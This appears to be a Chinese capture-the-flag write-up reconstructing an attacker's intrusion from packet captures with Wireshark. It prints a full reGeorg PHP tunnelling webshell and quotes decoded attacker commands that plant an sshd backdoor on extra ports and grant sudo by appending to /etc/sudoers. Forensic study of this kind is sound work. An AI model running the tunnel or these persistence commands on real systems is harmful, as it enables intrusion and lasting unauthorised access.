---
date: 2018-06-09
title: "2018铁三赛第十一赛区数据赛WriteUp"
description: "　　2018\"西普杯\"信息安全铁人三项赛第十一赛区数据赛WriteUp"
categories: ["WriteUp"]
---

　　本次铁三我和学长负责数据赛，总的来说还是挺简单的，如果不跳题去搏后面的分，那数据赛就是赛区并列第一。看dalao们的wp发现至少有14题，而我们做了11题。赛前就想着要把题目截下来，但是比着比着就忘了，题目都是我赛后靠记忆写下了的，题目描述可能有出入。

  赛后再次仔细的理了一遍黑客的进攻过程，发现比赛中有很多答案是碰巧拿到的，所以这里写个writeup兼总结，全面地分析黑客进攻思路和过程以正确地得到答案，同时看看攻击过程中有没有值得学习的地方。

  题目数据包：<https://pan.baidu.com/s/1Qm3i62laF2HIwuRJVGu8hg>  密码：87qg

  解压密码：t3sec.org.cn

  分析工具：Wireshark（主）、科来网络分析系统（辅）

  参考资料：<https://wiki.wireshark.org/DisplayFilters>

  <https://www.wireshark.org/docs/dfref/>

  题目顺序是按黑客的渗透过程出的，所以分析数据包时，可以按照题目逐个包分析

### 0x01 黑客第一个攻击目标ip

  在第1个包中使用http.request过滤，发现大量扫描目录的请求，于是得到黑客的ip：202.1.1.2 和目标1的ip：**```192.168.2.20```**

![](https://blog-zijui.oss-cn-shenzhen.aliyuncs.com/images/t3sec2018-data-writeup/1.png)

### 0x02 黑客在目标1系统中注册的账号和密码

  注册一般通过POST方法提交注册信息，过滤http的POST方法以及源ip

![](https://blog-zijui.oss-cn-shenzhen.aliyuncs.com/images/t3sec2018-data-writeup/2.png)

  发现疑似注册页面的URI：/index.php/web/system/reg/，看请求参数得到答案**```hack:hack123```**

### 0x03 黑客将一句话木马**注入进页面**，找出请求包**编号**

  上一题过滤结果的最后一个POST请求中发现了php一句话木马，连shell的参数为`'kaka'`，过滤ip和参数得到注入的请求包和后续的菜刀连shell请求。注入请求包编号为**```447921```**。

### 0x04 黑客使用菜刀连shell时的session

  第3题中得到菜刀连shell的请求。

![](https://blog-zijui.oss-cn-shenzhen.aliyuncs.com/images/t3sec2018-data-writeup/3.png)

  `ci_session=336322580ecdc0849e195f9c4b9c451fdafe771a`

  通过上面的session可以跟踪黑客的操作。过滤后分析，对木马传递的action、z1和z2参数进行base64解码，结合响应内容分析黑客的攻击行为。在2号包中，黑客查看了当前目录、uname信息、网络配置信息以及/etc/passwd文件等，这里就不上图了。

### 0x05 黑客上传了一个扫描文件，找出文件的**绝对路径**

  2号包分析完，在3号包中继续分析黑客攻击行为。

  黑客查看了/var/www/html/Vwins/addons/目录以及其子目录emulator、system和vip，还修改了system/function.php文件（但是只是修改了post的参数名，这个php我也没读懂是干嘛的）。

  随后黑客在emulator目录下上传了两个文件model.php和scan.php。将木马文件上传请求中的z1参数解码就得到扫描文件的绝对路径`/var/www/html/Vwins/addons/emulator/scan.php`

![](https://blog-zijui.oss-cn-shenzhen.aliyuncs.com/images/t3sec2018-data-writeup/4.png)

  来看一下scan.php，发现是一个端口扫描程序，这意味着黑客的攻击进入了第二阶段，开始横向移动。

### 0x06 黑客进入攻击目标2，所在的当前目录

  题目跳的有点快。。。还是先来看看黑客怎么拿到目标2的。

  前面的包里有端口扫描结果，扫出来有用的只有192.168.1.30:7001，再来看看之前上传的model.php

```php
<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
                    foreach($rx_matches as $ak_key => $ak_val) {
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[$arh_key] = $val;
            }
        }
        return( $arh );
    }
}
if ($_SERVER['REQUEST_METHOD'] === 'GET')
{
    exit("Georg says, 'All seems fine'");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    set_time_limit(0);
    $headers=apache_request_headers();
    $cmd = $headers["X-CMD"];
    switch($cmd){
        case "CONNECT":
            {
                $target = $headers["X-TARGET"];
                $port = (int)$headers["X-PORT"];
                $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                if ($sock === false) 
                {	
                    header('X-STATUS: FAIL');
                    header('X-ERROR: Failed creating socket');
                    return;
                }
                $res = @socket_connect($sock, $target, $port);
                if ($res === false) 
                { 
                    header('X-STATUS: FAIL');
                    header('X-ERROR: Failed connecting to target');
                    return;
                }
                socket_set_nonblock($sock);	
                @session_start();
                $_SESSION["run"] = true;
                $_SESSION["writebuf"] = "";
                $_SESSION["readbuf"] = "";
                ob_end_clean();
                header('X-STATUS: OK');
                header("Connection: close");
                ignore_user_abort();
                ob_start();
                $size = ob_get_length();
                header("Content-Length: $size");
                ob_end_flush();
                flush();            
                session_write_close();
                
                while ($_SESSION["run"])
                {
                    $readBuff = "";
                    @session_start();
                    $writeBuff = $_SESSION["writebuf"];
                    $_SESSION["writebuf"] = "";
                    session_write_close();
                    if ($writeBuff != "")
                    {
                        $i = socket_write($sock, $writeBuff, strlen($writeBuff));
                        if($i === false)
                        { 
                            @session_start();
                            $_SESSION["run"] = false;
                            session_write_close();
                            header('X-STATUS: FAIL');
                            header('X-ERROR: Failed writing socket');
                        }
                    }
                    while ($o = socket_read($sock, 512)) {
                        if($o === false)
                        { 
                            @session_start();
                            $_SESSION["run"] = false;
                            session_write_close();
                            header('X-STATUS: FAIL');
                            header('X-ERROR: Failed reading from socket');
                        }
                        $readBuff .= $o;
                    }
                    if ($readBuff!=""){
                        @session_start();
                        $_SESSION["readbuf"] .= $readBuff;
                        session_write_close();
                    }
                    #sleep(0.2);
                }
                socket_close($sock);
            }
            break;
        case "DISCONNECT":
            {
                error_log("DISCONNECT recieved");
                @session_start();
                $_SESSION["run"] = false;
                session_write_close();
                return;
            }
            break;
        case "READ":
            {
                @session_start();
                $readBuffer = $_SESSION["readbuf"];
                $_SESSION["readbuf"]="";
                $running = $_SESSION["run"];
                session_write_close();
                if ($running) {
                    header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
                    echo $readBuffer;
                    return;
                } else {
                    header('X-STATUS: FAIL');
                    header('X-ERROR: RemoteSocket read filed');
                    return;
                }
            }
            break;
        case "FORWARD":
            {
                @session_start();
                $running = $_SESSION["run"];
                session_write_close();
                if(!$running){
                    header('X-STATUS: FAIL');
                    header('X-ERROR: No more running, close now');
                    return;
                }
                header('Content-Type: application/octet-stream');
                $rawPostData = file_get_contents("php://input");
                if ($rawPostData) {
                    @session_start();
                    $_SESSION["writebuf"] .= $rawPostData;
                    session_write_close();
                    header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
                    return;
                } else {
                    header('X-STATUS: FAIL');
                    header('X-ERROR: POST request read filed');
                }
            }
            break;
    }
}
?>
```

  model.php是一个[reGeorg](https://github.com/sensepost/reGeorg)脚本，用于端口转发进行内网渗透，CONNECT 开启一个 socket, FORWARD 往 socket 里面写数据, READ读数据，DISCONNECT断开链接。

  在4号包里可以看到黑客连接了 192.168.1.30:7001 端口, 7001 是 WebLogic 的端口, 那么可以猜测黑客是想利用WebLogic漏洞进行攻击，目标2的ip也确定了：`192.168.1.30`

![](https://blog-zijui.oss-cn-shenzhen.aliyuncs.com/images/t3sec2018-data-writeup/5.png)

  过滤目的ip.dst为目标2的包，再追踪TCP流。4号包前面都是拿shell的过程，在的4787号TCP流中，黑客使用pwd命令查看了当前目录 `/usr/src/wls12130/user_projects/domains/product_display`

### 0x07 目标2的物理地址

  上一题的TCP流中，黑客还执行了ifconfig，得到物理地址 `52:54:00:86:0F:D4`，注意要大写。也可以由目标2的ip来获取MAC，但是数据包在由网关进行转发时会替换MAC地址，用wireshark会比较难找，用科来就可以在非广播arp包中直接找到。

### 0x08 黑客在第二个目标机上添加的用户名和密码是什么

  在前两题的TCP流的最后，以及5号包TCP流中，发现了useradd命令以及使用echo修改用户密码的命令，得到黑客添加的用户名和密码 `mailer:test`

![](https://blog-zijui.oss-cn-shenzhen.aliyuncs.com/images/t3sec2018-data-writeup/6.png)

### 0x09 目标2的后台的用户名和密码是多少

  6号包里除了netstat就没什么有用的东西了。在7号包里过滤http，发现黑客访问了后台登录页面LoginForm.jsp，紧接着就进行了登录。在登录数据包里发现了后台的用户名和密码 `webadmin:web_pass`

![](https://blog-zijui.oss-cn-shenzhen.aliyuncs.com/images/t3sec2018-data-writeup/7.png)

### 0x0A 黑客什么时候上传了后门程序包

  7号包里的最后4个http包的请求url和请求数据类型都非常可疑。这4个请求URL分别为selectUploadApp、uploadApp、appSelected和targetStyleSelected，可以猜测这几个请求进行了上传。

  uploadApp所POST数据的类型是multipart/form-data，这种类型常用于文件上传。

  appSelected中给出了上传的文件名为index.war，war文件就是Java的web应用程序包。

  再看看8号包里黑客利用的后门就是index，所以黑客上传后门程序包的请求就是uploadApp请求。在视图里设置时间显示格式，就得到答案 `15:23:49.475745`

![](https://blog-zijui.oss-cn-shenzhen.aliyuncs.com/images/t3sec2018-data-writeup/8.png)

### 0x0B 目标2上webshell的后台密码

  顺着index找，在8号包里找到了webshell的后台密码 `admin`，后面还执行了whoami，知道了后门是JShell。

![](https://blog-zijui.oss-cn-shenzhen.aliyuncs.com/images/t3sec2018-data-writeup/9.png)

### 0x0C 在目标1上的/tmp/fun文件的内容是什么

  题目又跳了，而且跨度还有点大，比赛的时候直接懵逼了，十一赛区的队伍都卡在这了，我们跳过了这题想搏一搏后面的分，结果不仅后面的分没拿到，跳题还倒扣13分\_(:з」∠)\_。

  这里使用一个wireshark的技巧。比赛给的包都很大，但是我们只需要里面的部分帧，而逐个包过滤会很费时间。首先将每个包需要的内容过滤出来，导出特定分组保存，再使用mergecap命令将所有导出的包合并到一起。合并的包就只有我们需要的东西，分组会少很多，过滤和追踪流也会快很多，方便下面的分析。

```bash
mergecap -w 目标文件 源文件 # 目标文件为合并后的文件名，源文件可以使用通配符
```

  追踪TCP流，发现一直到13号包，黑客都在鼓捣dnscat，dnscat是一个dns隧道工具，但是在前面的包中并没有看到使用dnscat传输数据的痕迹。而在14、15号包中则发现了大量查询中带有dnscat字样的dns包。

![](https://blog-zijui.oss-cn-shenzhen.aliyuncs.com/images/t3sec2018-data-writeup/10.png)

  dnscat有自己的协议，需要知道它的报文格式才能对它的内容进行提取分析。我在github上找到了一个[英文版dnscat协议解析](https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md)，还简书上找到了它的[中文翻译版](https://www.jianshu.com/p/42fcf74fef1c)。dnscat的报文在dns报文的查询名(Queries里的Name)字段中，根据dnscat报文格式，除了报文前的```dnscat.```前缀，报文中从第19位起就是实际的数据。

  下面就是要提取分析dnscat的数据内容了。首先用上面说的技巧将14、15号包中含有dnscat字段的帧提取合并成一个包，再用tshark命令将dns.qry.name字段提取出来。

```bash
tshark -r dns.pcapng -T fields -e dns.qry.name > dnsdata.txt
```

  再撸个py转换一下。

```python
# -*- coding: UTF-8 -*-
import base64

dnsdata = open("dnsdata.txt").read().split("\n")
result = open("result.txt", "wb")

data = set()
for line in dnsdata:
    data.add(line)

for i in data:
    result.write(base64.b16decode(i[25:].replace(".", "").upper()))
```

  得到的数据大部分都是乱码，其中有用的内容只有4条

```bash
ln -sf /usr/sbin/sshd /tmp/chsh; /tmp/chsh -oPort=7777
ln -sf /usr/sbin/sshd /tmp/chsh; /tmp/chsh -oPort=6666;
echo 'mailer    ALL=(ALL)    ALL'  >>  /etc/sudoers 
echo helloworld > /tmp/fun
```

  显然，这一题的答案已经找到 `helloworld`

### 0x0D 黑客什么时候将目标2上添加的用户加入到sudo组中

  上面提取到的命令里有用echo将用户添加到sudo组中，将该命令对应的dns包找到就是了。要注意黑客在JShell中也尝试过同样的操作但没有成功，不要找错包。

### 0x0E 在目标 2 上黑客执行某命令开启了一个端口作为后面, 这条命令是什么

  这个就是上面提取到的前两个命令了。